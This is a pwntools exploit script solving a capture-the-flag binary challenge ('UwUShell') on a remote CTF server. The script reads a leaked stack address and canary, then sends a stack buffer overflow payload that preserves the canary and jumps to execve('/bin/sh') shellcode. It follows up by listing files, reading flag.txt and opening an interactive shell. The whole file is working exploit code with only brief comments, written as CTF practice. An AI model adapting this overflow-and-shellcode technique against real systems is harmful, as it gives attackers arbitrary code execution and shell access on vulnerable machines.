from pwn import *

binary = "./UwUShell"
context.log_level = 'debug'
context.arch = 'amd64'

r = remote('chal.firebird.sh', 35026)
# r = process(binary)

# receive stack addr. and canary
r.recvuntil(b'0x')
stack_addr = int(b'0x' + r.recvuntil(b' ', drop=True), 16)

r.recvuntil(b'0x')
canary = int(b'0x' + r.recvuntil(b' ', drop=True), 16)

log.info('stack address: ' + hex(stack_addr))
log.info('canary: ' + hex(canary))

# execve('/bin/sh', 0, 0) rax = 0x3b, rdi = addr. of '/bin/sh', rsi = 0, rdx = 0
shellcode = asm('''
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp

mov rsi, 0
mov rdx, 0

mov rax, 0x3b
syscall
''')
payload = flat(
    b'A' * 0x18,
    p64(canary),
    b'B' * 0x8,
    p64(stack_addr + 0x18 + 8 + 8 + 8),
    shellcode
)

r.recvuntil(b'you pass!')
r.sendline(payload)
r.sendline(b'ls')
r.sendline(b'cat flag.txt')
r.interactive()